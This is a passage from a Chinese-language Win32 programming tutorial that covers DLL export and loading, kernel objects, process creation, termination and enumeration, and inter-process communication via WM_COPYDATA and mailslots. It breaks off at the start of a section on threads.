title="声明导出"></a>声明导出</h2><p>在需要导出函数的头文件中声明</p><p>extern “C” _declspec(dllexport) <strong>void pr();</strong>//需要声明的函数即返回类型</p><p>注意一定要在cpp文件中包含头文件，不然找不到该函数的定义</p><h2 id="模块定义文件导出"><a href="#模块定义文件导出" class="headerlink" title="模块定义文件导出"></a>模块定义文件导出</h2><p>添加一个.def文件 ，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Fun1 @<span class="number">1</span></span><br><span class="line">Fun2 @<span class="number">2</span></span><br></pre></td></tr></table></figure><p>Fun1和Fun2是函数名，@1表示导出函数的序号</p><p>在属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p><p>调用dll中函数的方式，有两种：</p><h2 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h2><p> 包含头文件，头文件中含有导出函数的声明。<br>​ 载入lib文件 #pragma comment（lib,“”）;<br>​ 直接调用函数即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;..\Dll1\Dll1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;..\\Debug\\Dll1.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fun1</span>();</span><br><span class="line">    <span class="built_in">fun2</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="显示调用"><a href="#显示调用" class="headerlink" title="显示调用"></a>显示调用</h2><p>使用显示调用不需要头文件，但是你需要知道函数的原型（返回值类型，各个参数的类型）。<br>LoadLibrary（）将目标dll强行加载到本进程中。<br>GetProcAddress()获得函数的地址。<br>自然就可以调用此函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">void</span><span class="params">(*FUN)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">FUN g_Fun;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule =  <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;Dll1.dll&quot;</span>);</span><br><span class="line">    g_Fun =  (FUN)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;fun1&quot;</span>);</span><br><span class="line"><span class="built_in">g_Fun</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ib文件的差别："><a href="#ib文件的差别：" class="headerlink" title="ib文件的差别："></a>ib文件的差别：</h2><p>随着dll一起生成的lib文件，称之为导入库，里面是没有代码和数据，是链接信息，供编译器再exe文件与dll文件做链接的。<br>还有一种是静态对象库，编译的时候会将静态库中的使用到的代码数据编译到exe中，exe发布就不需要携带很多文件。</p><h1 id="七、进程"><a href="#七、进程" class="headerlink" title="七、进程"></a>七、进程</h1><p>1 内核对象的概念</p><p>2 进程，模块，线程</p><p>概念</p><p>基本操作：</p><p>进程 模块 线程的遍历</p><p>进程的终止 强制结束 进程间的通讯</p><p>线程挂起 恢复 终止 强制结束</p><p>3 文件操作</p><p>难点：递归遍历文件</p><p>4 线程同步：原子操作 临界区 互斥体 事件 信号量</p><p>5 同步IO和异步IO</p><p>6 基本的网络编程 TCP UDP</p><p>7 IOCP模型</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一、 如何理解内核对象的概念？</p><p>a. windows操作系统的设计是面向对象的，很多的组件都是以对象的方式去管理的。将整个操作系统的内核看成是一个封装体，API函数就是对外的接口。然后通过给API传递句柄去实现操作具体的某一个对象，句柄就是对象的标识。windows管理的对象也有很多类型，不同类型的对象的管理方式是不同的。</p><p>b. 所有的API函数都是隶属于不同的动态链接库（DLL文件）的。有三大DLL文件：</p><p>User32.dll GDI32.dll kernel32.dll</p><p>其中User32.dll和窗口，控件等有关，GDI32和绘制图形有关，Kernel32和操作系统的界面无关的很多机制有关。</p><p>这三种DLL创建出来的对象就可以分为3大类。管理方式就不一样。那么我们的内核对象有自己的管理方式。</p><p>c. 一个进程，是一个运行中的程序。</p><p>一个进程包含了一个运行中的程序所用到的所有资源：一个内存空间 内存空间中有很多的模块 内存空间被分成了两大部分—用户层和内核层</p><p>我们正常的普通程序只能访问用户层空间（00000000<del>7FFFFFFF）。大部分的对象（结构体变量）都是放在内核空间的（80000000</del>FFFFFFFF）。</p><p>所以我们自然不能直接访问到对象，而是通过句柄。</p><p>所有的进程内核层是共享的，不同的进程用户层空间是不一样。</p><p>2 内核对象有什么特点？？</p><p>特点1—内核对象是跨进程的：所有的内核对象存在于内核层的。既然内核层是大家共享的，所以内核对象也是可以跨进程的。</p><p>特点2—跨进程机制怎么管理呢？？：通过引用计数和内核对象句柄表管理的。</p><p>进程A的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象A的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象B的地址</td></tr></tbody></table></div><p>进程B的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><p>进程C的句柄表</p><div class="table-container"><table><thead><tr><th>1</th><th>内核对象M的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象N的地址</td><td></td></tr><tr><td>3</td><td>内核对象L的地址</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>4</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><p>如果一个内核对象被n个进程使用，引用计数就是n。没有被进程使用，引用计数就是0，没被任何进程使用，内核对象就会自动销毁。</p><p>特点3：每一个内核对象都有安全描述属性，我们通过创建对象的API是否包含这样一个参数，就能确定它是不是内核对象</p><p>3 通过我们怎么获得内核对象的句柄的</p><p>a. 自己创建的</p><p>b. 自己打开的（这个对象是已经创建好的）</p><p>c. 从父进程继承过来的。</p><p>d. 别的进程复制过来的。DuplicateHandle</p><h3 id="进程概念："><a href="#进程概念：" class="headerlink" title="进程概念："></a>进程概念：</h3><p>进程，简单来说，就是一个运行中的程序，包含了：</p><p>a. 一个虚拟的内存空间 所有程序的代码和数据都在这片内存空间中。</p><p>b. 内存空间中排布了很多的模块</p><p>c. 至少有一个线程</p><p>在进程的虚拟内存中，一般会加载一个exe，很多的dll。他们都称之为模块。</p><p>进程本身是一个综合了各种资源的东西，是不能执行代码，能够执行代码的是归属于进程的线程。</p><p>每一个线程都是一个独立的执行单元：</p><p>1 每一个线程有自己的一块堆栈。</p><p>2 每一个线程有自己的执行环境。</p><p>CPU在执行代码的时候，主要是依赖于一套寄存器：</p><p>通用寄存器：eax ebx ecx edx esi edi esp ebp</p><p>指令指针寄存器：eip 存储着下一条要执行的指令</p><p>段寄存器：cs ss ds es fs gs</p><p>…..</p><p>所有的线程都是操作系统统一去管理调度的，每一个线程都有自己的优先级。根据优先级决定先调用谁后调用谁。</p><p>线程发生切换，实际就是切换线程的执行环境，比如现在有A，B，C三个线程，此时线程A在执行，线程A的时间片用完了，就保存A的执行环境，看B和C的优先级谁高，假如是C高，那么就把C的线程环境加载到CPU中。</p><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><p>进程 模块 线程的遍历（非常重要的操作）</p><p>方法有很多 我们这里使用的是创建快照的方式：CreateToolHelp32Snapshot。</p><p>需要知道的几点：</p><p>a. 进程是操作系统管理的，遍历的时候，能够遍历出系统中的所有进程的信息：进程名，路径，进程ID</p><p> 遍历进程的用处：通常来说我们都是知道进程名，然后去找到ID（ID每一次程序运行的时候都是不一样的），我们如果要操作进程，就需要使用OpenProcess函数得到它的句柄，OpenProcess这个函数，就是根据进程ID得到句柄的。</p><p>b. 模块是属于某一个进程的，所以我们遍历模块的时候，需要指定遍历的是哪一个进程的模块。</p><p> 能够遍历出模块的信息为：模块名，模块的起始虚拟地址（加载基址）</p><p> 遍历模块的用处：a 可以知道一个程序都加载了哪些DLL，监测DLL注入 b 分析DLL中的PE文件信息，可以为我们分析一个程序提供依据。</p><p>c. 线程虽然也是属于某一个进程的，但是其管理是操作系统统一管理的，所以我们遍历的时候，也是遍历出操作系统中的所有线程。需要自己去过滤然后，得到某一个进程的线程。</p><p> 线程遍历，能够得到的信息有：线程ID，所属进程的ID。</p><p> 遍历线程的用处：可以得到进程中每一个线程的信息。可以操作这些线程，比如挂起，终止等等。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><div class="table-container"><table><thead><tr><th>WinExec</th><th>可以创建进程</th></tr></thead><tbody><tr><td>ShellExecute</td><td>可以创建一个进程，打印一个文件，浏览一个文件夹</td></tr><tr><td>system</td><td>也能够以控制台命令的方式打开一个进程</td></tr><tr><td>CreateProcess</td><td>创建进程</td></tr><tr><td>OpenProcess</td><td>打开进程</td></tr><tr><td>ExitProcess</td><td>退出本进程</td></tr><tr><td>TerminateProcess</td><td>结束其它进程</td></tr></tbody></table></div><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>1使用宏加载想要的进程#define PATH2 L”D:\Program Files (x86)\Tencent\QQ\Bin\QQScLauncher.exe”</p><p>2使用结构体PROCESS_INFORMATION定义加载进程信息的缓冲区</p><p>3使用CreateProcess函数创建进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2 <span class="string">L&quot;D:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQScLauncher.exe&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">CreateProcess</span>(</span><br><span class="line">PATH2,   <span class="comment">//路径</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//命令行参数</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//进程安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//线程安全属性</span></span><br><span class="line">FALSE,  <span class="comment">//是否继承句柄</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//创建方式</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//环境</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//当前的运行目录</span></span><br><span class="line">&amp;si,     <span class="comment">//启动信息</span></span><br><span class="line">&amp;pi      <span class="comment">//进程信息</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结束一个进程"><a href="#结束一个进程" class="headerlink" title="结束一个进程"></a>结束一个进程</h3><p>使用该进程PID打开进程从而获取到进程句柄</p><p>使用TerminateProcess函数结束进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 打开进程，得到句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_TERMINATE, FALSE, <span class="number">5312</span>);</span><br><span class="line"><span class="comment">//2. 终结进程</span></span><br><span class="line"><span class="built_in">TerminateProcess</span>(hProcess, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程与模块"><a href="#进程与模块" class="headerlink" title="进程与模块"></a>进程与模块</h2><div class="table-container"><table><thead><tr><th>CreateToolhelp32Snapshot</th><th>可以分别创建进程，线程，进程模块进程堆的快照</th></tr></thead><tbody><tr><td>Process32First</td><td>用来首次调用，获得第一个进程信息</td></tr><tr><td>Process32Next</td><td>以后的调用由它来完成，不断的获取进程信息</td></tr><tr><td>Module32First</td><td>用来首次调用，获得第一个模块信息</td></tr><tr><td>Module32Next</td><td>以后的调用由它来完成，不断的获取模块信息</td></tr><tr><td>Thread32First</td><td>用来首次调用，获得第一个线程信息</td></tr><tr><td>Thread32Next</td><td>以后的调用由它来完成，不断地获取线程信息</td></tr></tbody></table></div><p>创建快照</p><p>WIndows提供了一组快照的API，使用前需要包含TIHelp32.h头文件，这一组API</p><p> 能够给当前系统中所有进程拍一个快照，能够获取所有进程的一些基本信息</p><p> 能够当前系统中的线程拍一个快照</p><p> 能够给某一个进程拍模块快照</p><p> 能够给某一个进程拍堆快照</p><h3 id="进程的遍历"><a href="#进程的遍历" class="headerlink" title="进程的遍历"></a>进程的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp =  <span class="built_in">CreateToolhelp32Snapshot</span>(</span><br><span class="line">TH32CS_SNAPPROCESS,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">PROCESSENTRY32 pe = &#123;<span class="built_in">sizeof</span>(PROCESSENTRY32)&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hToolHelp, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:%S\n&quot;</span>, pe.th32ProcessID, pe.szExeFile);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hToolHelp, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块的遍历"><a href="#模块的遍历" class="headerlink" title="模块的遍历"></a>模块的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp = <span class="built_in">CreateToolhelp32Snapshot</span>(</span><br><span class="line">TH32CS_SNAPMODULE,</span><br><span class="line"><span class="number">25076</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">MODULEENTRY32 me = &#123; <span class="built_in">sizeof</span>(MODULEENTRY32) &#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Module32First</span>(hToolHelp, &amp;me))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;模块名：%S  加载基址：%p\n&quot;</span>, me.szModule, me.modBaseAddr);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hToolHelp, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h2><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>COPYDATASTRUCT发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hWnd = (HWND)<span class="number">0x0003037E</span>;</span><br><span class="line"></span><br><span class="line">COPYDATASTRUCT cds = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="string">&quot;hahahahahahahahlou  world&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">cds.dwData = <span class="number">200</span>;<span class="comment">//随便写，写什么发什么</span></span><br><span class="line">cds.lpData = buf;</span><br><span class="line">cds.cbData = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_COPYDATA, <span class="number">0</span>, (LPARAM)&amp;cds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>邮槽发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 打开邮槽对象</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>, <span class="comment">// 邮槽名称</span></span><br><span class="line">GENERIC_WRITE,              <span class="comment">// 读写属性</span></span><br><span class="line">FILE_SHARE_READ,            <span class="comment">// 共享属性</span></span><br><span class="line"><span class="literal">NULL</span>,                       <span class="comment">// 安全属性</span></span><br><span class="line">OPEN_EXISTING,              <span class="comment">// 打开方式</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,      <span class="comment">// 标志位</span></span><br><span class="line"><span class="literal">NULL</span>);                      <span class="comment">// 文件模板（默认留空）</span></span><br><span class="line"><span class="comment">// 2. 向mailslot写入</span></span><br><span class="line">DWORD  dwWritten;</span><br><span class="line">LPSTR  lpMessage = (LPSTR)<span class="string">&quot;邮槽测试消息！&quot;</span>;</span><br><span class="line">DWORD  dwMegLen = <span class="built_in">strlen</span>(lpMessage) + <span class="built_in">sizeof</span>(CHAR);</span><br><span class="line"><span class="built_in">WriteFile</span>(hFile, lpMessage, dwMegLen, &amp;dwWritten, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 3. 结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;已经向邮槽写入信息！\n&quot;</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收消息"><a href="#接收消息" class="headerlink" title="接收消息"></a>接收消息</h3><p>COPYDATA接收只需在回调函数的WM_COPYDATA消息响应定义接收的结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COPYDATA:</span><br><span class="line">&#123;</span><br><span class="line">PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="number">0</span>, (<span class="type">char</span>*)(pcds-&gt;lpData), <span class="string">&quot;提示&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 创建邮槽对象</span></span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>,    <span class="comment">// 邮槽名</span></span><br><span class="line"><span class="number">0</span>,         <span class="comment">// 不限制消息大小 </span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,         <span class="comment">// 无超时 </span></span><br><span class="line">(LPSECURITY_ATTRIBUTES)<span class="literal">NULL</span>    <span class="comment">// 安全属性</span></span><br><span class="line">); </span><br><span class="line"><span class="comment">// 2. 循环读取邮槽信息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 2.1 获取邮槽消息数量</span></span><br><span class="line">DWORD dwMsgCount = <span class="number">0</span>, dwMsgSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">GetMailslotInfo</span>(     <span class="comment">/* 获取邮槽信息 */</span></span><br><span class="line">hSlot,           <span class="comment">// 邮槽句柄 </span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>,<span class="comment">// 无最大消息限制</span></span><br><span class="line">&amp;dwMsgSize,      <span class="comment">// 下一条消息的大小</span></span><br><span class="line">&amp;dwMsgCount,     <span class="comment">// 消息的数量</span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>);<span class="comment">// 无时限</span></span><br><span class="line"><span class="keyword">if</span> (dwMsgSize == MAILSLOT_NO_MESSAGE) &#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="keyword">while</span> (dwMsgCount)</span><br><span class="line">&#123;</span><br><span class="line">PBYTE lpBuffer;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwMsgSize + <span class="number">0x10</span>];</span><br><span class="line"><span class="comment">// 读取邮槽中的信息</span></span><br><span class="line">DWORD dwRet;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(lpBuffer, dwMsgSize);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hSlot, lpBuffer, dwMsgSize, &amp;dwRet, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile函数执行失败，错误码：%d.\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;邮槽的内容: %s\n&quot;</span>, lpBuffer);</span><br><span class="line"><span class="comment">// 计算剩余的消息数</span></span><br><span class="line"><span class="built_in">GetMailslotInfo</span>(hSlot, (LPDWORD)<span class="literal">NULL</span>, &amp;dwMsgSize, &amp;dwMsgCount, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="八，线程"><a href="#八，线程" class="headerlink" title="八，线程"></a>八，线程</h1><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span 